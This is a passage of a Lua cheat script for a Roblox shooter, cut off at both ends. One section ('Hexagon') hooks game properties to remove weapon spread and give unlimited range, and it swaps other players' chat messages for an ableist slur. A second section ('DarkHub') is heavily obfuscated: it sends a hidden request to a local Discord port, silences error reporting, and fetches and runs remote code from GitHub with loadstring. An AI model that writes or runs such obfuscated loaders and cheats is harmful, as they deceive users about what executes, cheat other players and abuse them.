		elseif self.Name == "Range" and library.pointers.MiscellaneousTabCategoryGunModsInfiniteRange.value == true then
			return 9999
		elseif self.Name == "RangeModifier" and library.pointers.MiscellaneousTabCategoryGunModsInfiniteRange.value == true then
			return 100
		elseif (self.Name == "Spread" or self.Parent.Name == "Spread") and library.pointers.MiscellaneousTabCategoryGunModsNoSpread.value == true then
			return 0
		elseif (self.Name == "AccuracyDivisor" or self.Name == "AccuracyOffset") and library.pointers.MiscellaneousTabCategoryGunModsNoSpread.value == true then
			return 0.001
		end
	end

    return oldIndex(self, idx)
end))

getsenv(game.Players.LocalPlayer.PlayerGui.GUI.Main.Chats.DisplayChat).createNewMessage = function(plr, msg, teamcolor, msgcolor, offset, line)
	if library.pointers.MiscellaneousTabCategoryMainNNSDontTalk.value == true and plr ~= game.Players.LocalPlayer.Name then
		msg = "I am retarded."
	end
	
	return createNewMessage(plr, msg, teamcolor, msgcolor, offset, line)
end

CharacterAdded()

table.foreach(game.Players:GetPlayers(), PlayerAdded)
game.Players.PlayerAdded:Connect(PlayerAdded)

for i,v in pairs({"CT", "T"}) do
	LocalPlayer.PlayerGui.GUI.Scoreboard[v].ChildAdded:Connect(function(child)
		wait(0.1)
		
		if child.Parent == LocalPlayer.PlayerGui.GUI.Scoreboard[v] and child:FindFirstChild("player") and child.player.Text ~= "PLAYER" and UserInputService:IsKeyDown(Enum.KeyCode.Tab) then
			if game.Players:FindFirstChild(child.player.Text) and game.Players[child.player.Text].OsPlatform:sub(1,1) == "|" then
				plr = game.Players[child.player.Text]
				child.player.Text = plr.OsPlatform:sub(2, 41).." "..plr.Name
				
				updater = plr:GetPropertyChangedSignal("OsPlatform"):Connect(function()
					if child and child.Parent and child:FindFirstChild("player") or UserInputService:IsKeyDown(Enum.KeyCode.Tab) and plr.OsPlatform:sub(1,1) == "|" then
						child.player.Text = plr.OsPlatform:sub(2, 41).." "..plr.Name
					else
						updater:Disconnect()
					end
				end)
			end
		end
	end)
end

if readfile("hexagon/autoload.txt") ~= "" and isfile("hexagon/configs/"..readfile("hexagon/autoload.txt")) then
	local a,b = pcall(function()
		cfg = loadstring("return "..readfile("hexagon/configs/"..readfile("hexagon/autoload.txt")))()
	end)
	
	if a == false then
		warn("Config Loading Error", a, b)
	elseif a == true then
		library:LoadConfiguration(cfg)
	end
end

print("Hexagon finished loading!")

Hint.Text = "Hexagon | Loading finished!"
wait(1.5)
Hint:Destroy()
end)

local DarkHub = ScriptsTab.AddButton("DarkHub", function()
local owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO=string local uwUOwOowoUwuOwOuWuOwOUwUowOUwUuwUOwOUwUoWoUwUuWuOwOuWUuWUowOOwO=getfenv()[owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO.char((function()local owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO="9711977E4BD67AF4C8B8EF6DA1C80F6117DA4E2E8F75CE0764B2E5DE65708CD1FD38DC7E6"return#owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO+0 end)(),110  ,118  ,105  ,(function()local owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO="A75D308693EDE1FDB5DBA3DFFB2DBA969A2AA68C005C91C9350D2B3EE293ED553580AF3FA2167E4ABF8DB8E5D57032C46B21"return#owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO+16 end)(),101  )..owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO.char()..'']local UwuOwOoWouwUUwUOwOOwOUwuOwOuWUuWuUwUUwUOwooWoOwOowoUwUOwOuwUUwU=getfenv()[owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO.char(104 ,116 ,116 ,112 ,95 ,114 ,101 ,113 ,117 ,101 ,115 ,116 )..'']local OwOOwOOwOuWUUwUuwUUwUOwOuwUowOUwuuwUUwUOWoOwOOwOuwUOWOUwUOwOUwU=getfenv()[owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO.char(114 ,101 ,113 ,(function()local owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO="61A1FEC8F7820364E72D367FAD11AE91AFFC32D7444777A2396208E9D53230B324B83445EAADA7585A47B384BDF273CFB4BB"return#owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO+17 end)(),101 ,115 ,(function()local owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO="7818ACD42927DA30B51778BA6A99910A2279BDC3D86BA564F232D7088220F6F7B8DAF47A9CD61BE1C6AEE32253C4D7C94B6D"return#owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO+16 end)())..'']local owOOwouwUuWUOWoUwUUwuuWUOWOUwUUwuuwUUWUOwoOwOOwOUwUUwUOWoUWuUwu=getfenv()[owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO.char(115 ,121 ,110 )..'']local UWUOWOUwUOwOowoOwOUwUuwUUwuuwUuWuuWUowOUwUOwOowOOwOOWOOwoOwOUWu=getfenv()[owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO.char(103 ,97 ,109 ,101 )..'']local UwuOwOoWouwUUwUOwOOwOUwuOwOuWUuWuUwUUwUOwooWoOwOowoUwUOwOuwUUwU=UwuOwOoWouwUUwUOwOOwOUwuOwOuWUuWuUwUUwUOwooWoOwOowoUwUOwOuwUUwU or owOOwouwUuWUOWoUwUUwuuWUOWOUwUUwuuwUUWUOwoOwOOwOUwUUwUOWoUWuUwu and owOOwouwUuWUOWoUwUUwuuWUOWOUwUUwuuwUUWUOwoOwOOwOUwUUwUOWoUWuUwu.request or OwOOwOOwOuWUUwUuwUUwUOwOuwUowOUwuuwUUwUOWoOwOOwOuwUOWOUwUOwOUwU or nil  if UwuOwOoWouwUUwUOwOOwOUwuOwOuWUuWuUwUUwUOwooWoOwOowoUwUOwOuwUUwU then uwUOwOowoUwuOwOuWuOwOUwUowOUwUuwUOwOUwUoWoUwUuWuOwOuWUuWUowOOwO=owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO.char(50 ,(function(owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO,owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO)local owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO={352,468,664,878,363}return#owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO end)()+98,52 ,80 ,(function(owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO,owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO)local owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO={237,171,230,990,859}return#owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO end)()+47,97 ,53 ,102 ,114 ,71 )..''UwuOwOoWouwUUwUOwOOwOUwuOwOuWUuWuUwUUwUOwooWoOwOowoUwUOwOuwUUwU({[owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO.char(77 ,101 ,116 ,104 ,111 ,100 )..'']=owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO.char(80 ,79 ,83 ,84 )..'',[owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO.char(72 ,101 ,97 ,100 ,101 ,114 ,115 )..'']={[owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO.char(111 ,114 ,105 ,103 ,105 ,110 )..""]=owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO.char(104 ,116 ,116 ,112 ,115 ,58 ,(function()local owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO="FDBA5AAF7454DAF798CF032808CAE4CF1A1B07C9F3752D7"return#owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO+0 end)(),47 ,100 ,105 ,115 ,(function()local owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO="48401404FFE9A74DB9348C4DD2822CAE7DFCDE6C539F0B0702442FAB978FA39F62510D1F90FDAC6CE803FD5505E07A5F32C"return#owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO+0 end)(),111 ,114 ,100 ,46 ,99 ,111 ,109 )..'',[owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO.char(67 ,111 ,110 ,116 ,101 ,110 ,116 ,45 ,84 ,(function(owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO,owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO)local owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO={495,677,644,434,943}return#owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO end)()+116,112 ,101 )..""]=owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO.char(97 ,112 ,112 ,108 ,105 ,99 ,97 ,116 ,105 ,111 ,(function(owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO,owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO)local owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO={27,804,965,160,5}return#owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO end)()+105,47 ,106 ,115 ,111 ,110 )..""},[owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO.char(85 ,(function()local owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO="4DAADDB13D4DE96789F4C3A6372446BA659D718D2A30880C3D022F1C41F136948EA8216EC36E66C12A992822F9AEB34202CF"return#owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO+14 end)(),108 )..'']=owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO.char((function(owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO,owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO)local owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO={691,374,530,798,527}return#owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO end)()+99,116 ,116 ,112 ,58 ,47 ,47 ,49 ,50 ,55 ,46 ,48 ,46 ,48 ,46 ,49 ,58 ,54 ,52 ,54 ,51 ,47 ,114 ,112 ,99 ,63 ,118 ,61 ,49 )..'',[owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO.char(66 ,111 ,100 ,121 )..'']=UWUOWOUwUOwOowoOwOUwUuwUUwuuwUuWuuWUowOUwUOwOowOOwOOWOOwoOwOUWu:GetService(owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO.char(72 ,116 ,116 ,(function()local owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO="D5120999141201F91439A400AEDABB9B062284629868C1664B3B2FA99620E9D29838142CC785E646F0DC06FF77A9C6AA34B5"return#owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO+12 end)(),83 ,101 ,114 ,118 ,105 ,99 ,101 )..''):JSONEncode({cmd=owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO.char(73 ,78 ,86 ,73 ,84 ,69 ,95 ,66 ,82 ,79 ,87 ,83 ,69 ,(function()local owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO="B297337C0921FAA14DAC10E6E9ADCDF2E890EFC2652FD251D30628FB1A06D60C6DBD7ADD4F96D89B42"return#owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO+0 end)()).."",args={code=uwUOwOowoUwuOwOuWuOwOUwUowOUwUuwUOwOUwUoWoUwUuWuOwOuWUuWUowOOwO},nonce=UWUOWOUwUOwOowoOwOUwUuwUUwuuwUuWuuWUowOUwUOwOowOOwOOWOOwoOwOUWu:GetService(owOowOUwuUWuOWOowOOwOUWUUwUowoUwUuwUUwUuwUuwUUwuuWUoWOUwUUwUOwO.char(72 ,116 ,116 ,112 ,83 ,101 ,114 ,118 ,105 ,99 ,101 )..''):GenerateGUID(false ):lower()})})end
if getconnections then
  for i,v in pairs(getconnections(game:GetService("ScriptContext").Error)) do
    v:Disable()
  end
end

if game.GameId == 2429242760 then
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/BladeQuest'), true))()
    return
end
if game.GameId == 16680835 then
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Notoriety'), true))()
    return
end

if setclipboard then
  --setclipboard('https://discord.gg/darkhub')
end
local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO=string local UwUUwuOwOowoowOOwOOwOuWuowOOwoUWUuwUOWoUWuOwOowouWUUwuUwUOwOuWu=getfenv()[uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(115  ,121  ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="BBC843DFE3DD4C3B1961633601C90A415462A011C4082459033299B826B6566639E8272571DDF68263C69C4CE0B4A34AF812"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+10 end)())..uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char()..'']local OwOuWuUwUOwOOwOowOUwUuwUOwOOwOUwUowOUwUOwOUwUOwOUwuowOUwUuWuOWo=getfenv()[uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(105 ,115 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="E1D07EC1C747EA2F87107B62E500DDFA9919495E71FCF869540DA6811481D638BAD58A793E650AF76F565647F821D0E"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),115 ,105 ,114 ,104 ,117 ,114 ,116 ,95 ,99 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={735,278,471,530,722}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+103,111 ,115 ,117 ,114 ,101 )..'']local owOUwUuWuOwOOwOOwOUwUowOUwUUwUUwUuWuuwUOwOOwOowOuwUuwuOwOUwUUWu=getfenv()[uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(86 ,101 ,99 ,116 ,111 ,114 ,50 )..'']local OwoowOowOuWuUwuOwOuwUuwUOwouWuuwUOwooWoUWuOwOUwUuwUOwOOwOUwUOwO=getfenv()[uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(69 ,110 ,117 ,109 )..'']local uwUOwOUwUuwuOwOOwOOwOOwOUwUOwOowOOwOOwoOwOoWoOwOOwoOwoOWOuwuOwO=getfenv()[uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(112 ,97 ,105 ,114 ,115 )..'']local UWUOwOOWoUwuUWUUwUOwOUwUUwUuwUOwoOwOOwoUWUUwUuwUOwOowOUwUuwuUwu=getfenv()[uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(108 ,111 ,97 ,100 ,115 ,116 ,114 ,105 ,110 ,103 )..'']local uWUuwUOWoUwUOwoOwOOwOowOOwOuwUUwUOwOUWuowOUwUuwUowouwUOwOUwUuWu=getfenv()[uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(103 ,101 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="78B9B43C2E780440259799D12BBF86CB6352D6FFA068338FABBB0FAF4670B42668CD127DA2AC91B7A132C4FA521BDE325745"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+16 end)(),103 ,101 ,110 ,118 )..'']local OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU=getfenv()[uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(85 ,68 ,105 ,109 ,50 )..'']local OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU=getfenv()[uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(73 ,110 ,115 ,116 ,97 ,110 ,99 ,101 )..'']local uWUUwuowoOwOOwOuwUOwOuwUOwouwuUwUOwOOwOUWuOwOOwOowOUwUUwuuWuuwU=getfenv()[uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(119 ,97 ,105 ,116 )..'']local UwUOwoOwOOWOOwOUWUOwouWuOwOuWuuWuowOOwOoWOowoUwUuwuOwOOwOUwuuwU=getfenv()[uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(103 ,97 ,109 ,101 )..'']local uwUowOOwOuwUoWOuWuuwuUwUUwuuwUUwUUwuUwUuwUuwUuWUUwuuwUOwOOwoowO=getfenv()[uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(116 ,111 ,115 ,116 ,114 ,105 ,110 ,103 )..'']local UwUUwUOWouWuUwUOwoOwouwUuwuOwOOwOuwUOwOUwUowOUwuOwOOWoUwuuwUUwU=getfenv()[uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(84 ,119 ,101 ,101 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={545,519,218,43,669}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+105,73 ,110 ,102 ,111 )..'']local UwUOwOuWuOwOuWUOwOUWuuwUoWOuwUUwuOwOowOowoOwOUWuoWoUwUuwUOwOowO=getfenv()[uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(73 ,115 ,83 ,117 ,112 ,112 ,111 ,114 ,116 ,101 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="3586A5BE24A5BBFAB955AC8238F53F6F2C238C65AD5E74A2272259795834A059B27280005F876A2D6D7597B10067A82CAC08"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)())..'']local OWoUwuoWOOwOUwUUwUOwOOwOUwuOwOUwUOwOuwUUwUUwUUwUUwUowOUwuOwOOWO=getfenv()[uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(86 ,101 ,114 )..'']local UwuUwuUwUowOuwUUwuOWoUwuUWUoWoOwOowOowOowOuWuowOOWoOwoUwuUwUUwU=getfenv()[uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(67 ,111 ,108 ,111 ,114 ,51 )..'']local OwOoWoOWoOwOOwOUwUUWuuwUUwUuWuOwOOwOUwUowOUwUOwoOwoOwoOWoOwOOwO=getfenv()[uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(115 ,101 ,99 ,117 ,114 ,101 ,95 ,108 ,111 ,97 ,100 )..'']local UwuowOOwOuwUOwouwuuWUUWUOwOuwUOWOOWoUwUuwUUwuOwOOwOUWuOwOUwuOwO=getfenv()[uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char((function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={661,506,620,734,170}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+77,101 ,99 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="1B78BA92AFF36B526FD70A2C4C10A67FD6D29BDCFE96E15CDC25B6DCD26F6AB9BEF01BC882586F704712DACBC87988181FF5"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+16 end)())..'']local OwOowOUwUoWOOwoOwouwuuwUOwOOwOUWuowoowOUwUOwoUWUOwOUwUOwOowOUwU=getfenv()[uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(110 ,101 ,120 ,116 )..'']local oWoowOoWOUWUUWUUwUUwUoWoOwOOwOOwoOwOOwOOwOUwUuwUowOOwOUWuOWoowO=getfenv()[uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(85 ,68 ,105 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={6,7,536,538,923}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+104)..'']local uWUuWuUwuowOUwUowOUWUUwUUwUOwOOwOOwOUwUuwUUwuUWuowOowoUwUOwOUwU=getfenv()[uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(75 ,82 ,78 ,76 ,95 ,76 ,79 ,65 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={823,672,882,691,836}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+63,69 ,68 )..'']local OwOUwuowOUwuUWuowOOwoOwOuwuuwuOwOOwouWUUwuUWUUwuOwOOwouwUOWoOwO=getfenv()[uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(104 ,105 ,100 ,100 ,101 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="AF0550D0F506E944A4CCE6FFC57E299129923B62CFD9CFB6665ADFE026048987AA44B6C303089160D5B218E0B1ED1D7631FB"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+10 end)(),85 ,73 )..'']local OwOOwoUwUOWoUWUUWUowOuwUuWUOwOUwuoWoOwOuwUoWOOwOUwUUwUowOuwUOwO=getfenv()[uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(105 ,100 ,101 ,110 ,116 ,105 ,102 ,121 ,101 ,120 ,101 ,99 ,117 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="2B1BEAE61B83E040595500F9B7A519D61A09A3A042B83324F61CFA5739FF93E735758430B67B4E5A7191A703E64F435A2CC1"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+16 end)(),(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="8B3A0C3312DDA4DE9B4A0355EDD3FD7E56F792093CA4E8A954BA40B678CD1250172E504212A6CEE9F07759C9D127A15BD4C4"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+11 end)(),114 )..'']local owOUwUuWuuwUUwUOwoUwuUwUOwoOWOOwoUwuUwUOwouWuUwUUwuOwOOwoUWuOwO=getfenv()[uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(83 ,117 ,112 ,112 ,111 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={761,186,195,16,354}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+109,(function()local 